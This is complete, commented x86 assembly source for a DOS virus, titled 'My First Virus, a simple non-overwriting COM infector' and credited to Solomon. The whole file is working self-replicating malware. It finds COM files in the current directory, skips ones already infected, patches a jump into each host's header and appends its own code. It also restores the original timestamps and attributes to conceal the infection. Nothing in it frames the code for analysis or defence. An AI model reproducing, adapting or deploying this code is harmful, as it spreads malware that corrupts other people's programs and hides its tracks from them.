;******************************************************************
;*                                                                *
;*     My First Virus, a simple non-overwriting COM infector      *
;*                                                                *
;*                                  by, Solomon                   *
;*                                                                *
;******************************************************************

                  .model tiny                   ; Memory model
                  .code                         ; Start Code
                  org 100h                      ; Start of COM file

MAIN:             db 0e9h,00h,00h               ; Jmp START_VIRUS

START_VIRUS       proc near                     ; Real start of Virus
                  call FIND_OFFSET

; Calculate change in offset from host program.

FIND_OFFSET:      pop bp                        ; BP holds current IP
                  sub bp, offset FIND_OFFSET    ; Calculate net change
                                                ; Change BP to start of
                                                ; virus code

; Restore original bytes to the infected program.

                  lea si,[bp+ORIG_START]        ; Restore original 3 bytes
                  mov di,100h                   ; to 100h, start of file
                  push di                       ; Copy 3 bytes
                  movsw
                  movsb

; Change the DTA from the default so FINDFIRST/FINDNEXT won't destroy
; original command line parameters.

                  lea dx,[bp+NEW_DTA]           ; Point to new DTA area
                  call SET_DTA                  ; Go change it

; DOS Findfirst / Findnext services


FINDFIRST:        mov ah,4eh                    ; DOS find first service
                  lea dx,[bp+COM_MASK]          ; Search for any COM file
                  xor cx,cx                     ; Attribute mask
FINDNEXT:         int 21h                       ; Call DOS to do it
                  jc QUIT                       ; Quit if there are errors
                                                ; or no more files

; Ok, if I am here, then I found a possible victim. Open the file and
; check it for previous infections.

                  mov ax,3d00h                  ; DOS Open file, read only
                  lea dx,[bp+NEW_DTA+30]        ; Point to filename we found
                  int 21h                       ; Call DOS to do it
                  xchg ax,bx                    ; Put file handle in BX

; Check file for previous infection by checking for our presence at
; then end of the file.

                  mov ah,3fh                    ; DOS Read file
                  lea dx,[bp+ORIG_START]        ; Save the original header
                  mov cx,3                      ; Read 3 bytes
                  int 21h                       ; Call DOS to do it
                  mov ax,word ptr [bp+NEW_DTA+26]   ; Put filename in AX
                  mov cx,word ptr [bp+ORIG_START+1] ; Jmp offset
                  add cx,END_VIRUS-START_VIRUS+3; Convert to filesize
                  cmp ax,cx                     ; Compare file size's
                  jnz INFECT_COM                ; If healthy, go infect it
                  mov ah,3eh                    ; Otherwise close file and
                  int 21h                       ; try to find another victim
                  mov ah,4fh                    ; DOS find next file
                  jmp short FINDNEXT            ; Find another file

; Restore default DTA and pass control back to original program.
; Call any activation routines here.

QUIT:             mov dx,80h                    ; Restore original DTA
                  call SET_DTA                  ; Go change it
                  retn                          ; End Virus and start original
                                                ; Program. Remember, DI holding
                                                ; 100h was pushed on the stack.

;*** Subroutine INFECT_COM ***

INFECT_COM:

; Reset the file attributes to normal so I can write to the file

                  mov ax,4301h                  ; DOS change file attr
                  xor cx,cx                     ; Zero attributes
                  lea dx,[bp+NEW_DTA+30]        ; Point to filename in DTA
                  int 21h                       ; Call DOS to do it

; Calculate jump offset for header of victim so it will run virus first.

                  mov ax,word ptr [bp+NEW_DTA+26] ; Put filesize in AX
                  sub ax,3                      ; Subtract 3, size-jmp_code
                  mov word ptr [bp+JMP_OFFSET],ax ; Store new offset

; Close the file and reopen it for read/write. BX still holds file handle.

                  mov ah,3eh                    ; DOS close file
                  int 21h                       ; Call DOS to do it
                  mov ax,3d02h                  ; DOS open file, read/write
                  int 21h                       ; Call DOS to do it
                  xchg ax,bx                    ; Put file handle in BX

; Write the new header at the beginning of the file.

                  mov ah,40h                    ; DOS write to file
                  mov cx,3                      ; Write 3 bytes
                  lea dx,[bp+HEADER]            ; Point to the 3 bytes to write
                  int 21h                       ; Call DOS to do it

; Move to end of file so I can append the virus to it.

                  mov al,2                      ; Select end of file
                  call FILE_PTR                 ; Go to end of file

; Append the virus to the end of the file.

                  mov ah,40h                    ; DOS write to file
                  mov cx,END_VIRUS-START_VIRUS  ; Length of virus
                  lea dx,[bp+START_VIRUS]       ; Start from beginning of virus
                  int 21h                       ; Call DOS to do it

; Restore the file's original timestamp and datestamp.  These values were
; stored in the DTA by the Findfirst / Findnext services.

                  mov ax,5701h                  ; DOS set file date & time
                  mov cx,word ptr [bp+NEW_DTA+22] ; Set time
                  mov dx,word ptr [bp+NEW_DTA+24] ; Set date
                  int 21h                       ; Call DOS to do it

; Restore original file attributes.

                  mov ax,4301h                  ; DOS change file attr
                  mov cx,word ptr [bp+NEW_DTA+21] ; Get original file attr
                  lea dx,[bp+NEW_DTA+30]        ; Point to file name
                  int 21h                       ; Call DOS

; Lastly, close the file and go back to main program.

                  mov ah,3eh                    ; DOS close file
                  int 21h                       ; Call DOS to do it
                  jmp QUIT                      ; We're done

;*** Subroutine SET_DTA ***

SET_DTA           proc near
                  mov ah,1ah                    ; DOS set DTA
                  int 21h                       ; Call DOS to do it
                  retn                          ; Return
SET_DTA           endp


;*** Subroutine FILE_PTR ***


FILE_PTR          proc near
                  mov ah,42h                    ; DOS set read/write pointer
                  xor cx,cx                     ; Set offset move to zero
                  cwd                           ; Equivalent to xor dx,dx
                  int 21h                       ; Call DOS to do it
                  retn                          ; Return
FILE_PTR          endp



; This area will hold all variables to be encrypted

COM_MASK          db '*.com',0                  ; COM file mask

ORIG_START        db 0cdh,20h,0                 ; Header for infected file

HEADER            db 0e9h                       ; Jmp command for new header

START_VIRUS       endp

END_VIRUS         equ $                         ; Mark end of virus code

; This data area is a scratch area and is not included in virus code.

JMP_OFFSET        dw ?                          ; Jump offset for new header
NEW_DTA           db 43 dup(?)                  ; New DTA location

                  end MAIN
